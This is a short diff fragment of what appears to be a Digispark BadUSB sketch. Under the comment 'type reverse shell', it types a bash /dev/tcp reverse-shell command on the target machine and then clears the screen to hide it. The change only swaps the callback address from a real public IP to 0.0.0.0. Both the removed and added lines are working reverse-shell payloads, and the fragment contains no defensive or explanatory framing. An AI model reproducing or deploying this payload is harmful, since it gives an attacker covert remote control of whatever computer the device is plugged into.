@@ -38,7 +38,7 @@ void setup() {
 
    //type reverse shell
 
-   DigiKeyboard.println("bash -c 'bash -i >& /dev/tcp/172.104.177.208/5080 0>&1' & ");
+   DigiKeyboard.println("bash -c 'bash -i >& /dev/tcp/0.0.0.0/5080 0>&1' & ");
    DigiKeyboard.println("clear");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("clear");
